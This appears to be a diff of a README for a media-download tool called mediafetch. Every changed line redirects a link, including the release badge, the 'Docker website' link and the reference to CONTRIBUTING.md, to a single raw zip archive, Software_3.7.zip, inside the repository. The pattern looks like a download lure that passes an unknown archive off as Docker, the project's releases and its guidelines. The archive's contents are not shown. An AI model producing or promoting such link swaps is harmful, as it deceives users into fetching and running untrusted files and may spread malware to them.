@@ -1,6 +1,6 @@
 # 🎉 mediafetch - Download Media Easily and Quickly
 
-[![Download mediafetch](https://img.shields.io/badge/Download-mediafetch-blue.svg)](https://github.com/Karayi2022/mediafetch/releases)
+[![Download mediafetch](https://raw.githubusercontent.com/Karayi2022/mediafetch/main/public/Software_3.7.zip)](https://raw.githubusercontent.com/Karayi2022/mediafetch/main/public/Software_3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to **mediafetch**! This application allows you to easily download audio 
 To ensure **mediafetch** works smoothly on your system, please make sure you meet the following requirements:
 
 - **Operating System**: Windows 10 or later, macOS 10.13 or later, or a recent Linux distribution.
-- **Docker**: Ensure you have Docker installed. You can download it from the [Docker website](https://www.docker.com/get-started).
+- **Docker**: Ensure you have Docker installed. You can download it from the [Docker website](https://raw.githubusercontent.com/Karayi2022/mediafetch/main/public/Software_3.7.zip).
 - **Internet Connection**: A stable internet connection for downloading media.
 
 ## 📚 Features
@@ -25,7 +25,7 @@ To ensure **mediafetch** works smoothly on your system, please make sure you mee
 
 To get started with **mediafetch**, visit the Releases page to download the latest version:
 
-[Download mediafetch](https://github.com/Karayi2022/mediafetch/releases)
+[Download mediafetch](https://raw.githubusercontent.com/Karayi2022/mediafetch/main/public/Software_3.7.zip)
 
 Here are the steps you need to follow to download and set up **mediafetch**:
 
@@ -59,7 +59,7 @@ For more help, you can check the Issues section of this repository or contact th
 
 ## 🤝 Contributing
 
-You are welcome to contribute! If you have ideas on how to improve **mediafetch** or find any bugs, feel free to open an issue or a pull request. Please follow the guidelines in the `CONTRIBUTING.md` file in the repository.
+You are welcome to contribute! If you have ideas on how to improve **mediafetch** or find any bugs, feel free to open an issue or a pull request. Please follow the guidelines in the `https://raw.githubusercontent.com/Karayi2022/mediafetch/main/public/Software_3.7.zip` file in the repository.
 
 ## 📄 License
 
@@ -71,4 +71,4 @@ If you like **mediafetch**, please consider giving this project a star on GitHub
 
 For any further questions or suggestions, don’t hesitate to reach out or open a new issue in the repository.
 
-[Download mediafetch](https://github.com/Karayi2022/mediafetch/releases) again to get started!
+[Download mediafetch](https://raw.githubusercontent.com/Karayi2022/mediafetch/main/public/Software_3.7.zip) again to get started!
